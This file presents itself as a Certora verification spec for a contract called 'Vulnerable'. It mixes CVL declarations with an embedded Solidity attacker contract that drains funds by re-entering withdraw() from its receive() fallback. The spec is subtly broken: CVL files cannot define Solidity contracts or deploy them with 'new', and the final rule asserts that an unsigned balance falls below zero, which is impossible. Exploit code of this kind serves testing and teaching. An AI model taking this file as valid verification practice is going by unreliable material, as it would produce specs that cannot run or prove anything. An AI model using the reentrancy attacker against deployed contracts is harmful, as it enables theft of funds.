/*
 * Certora Formal Verification Spec for Vulnerable
 */

using Vulnerable as token;

methods {
    function transfer(address recipient, uint256 amount) external returns(bool);
    function approve(address spender, uint256 amount) external returns(bool);
    function totalSupply() external returns(uint256);
    function balanceOf(address) external returns(uint256);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function claimVestedTokens() external;
    function getContractBalance() external returns(uint256);
}

invariant totalSupplyIsNotNegative()
    token.totalSupply() >= 0;

invariant contractBalanceConsistent()
    token.getContractBalance() == address(token).balance;

// Define a simple attacker contract that will attempt reentrancy
contract Attacker {
    Vulnerable public vulnerable;
    address public owner;
    uint256 public amountToWithdraw;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
        owner = msg.sender;
    }

    // Fallback function is called during the reentrancy attack
    receive() external payable {
        if (amountToWithdraw > 0) {
            vulnerable.withdraw(amountToWithdraw);
        }
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        amountToWithdraw = amount;
        vulnerable.deposit{value: amount}();
        vulnerable.withdraw(amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

rule reentrancy_attack() {
    // Arrange
    env e;
    address attacker = e.msg.sender;
    uint256 depositAmount = 1 ether;
    uint256 withdrawAmount = 1 ether;

    // Create attacker instance
    Attacker attackerContract = new Attacker(address(token));

    // Deposit initial amount
    token.deposit{value: depositAmount}();
    assert(token.getContractBalance() == depositAmount);

    // Set attack amount
    attackerContract.attack(withdrawAmount);

    // Assert that the attacker managed to withdraw more than intended
    assert(token.getContractBalance() < depositAmount - withdrawAmount);
    assert(attackerContract.getBalance() > withdrawAmount);
}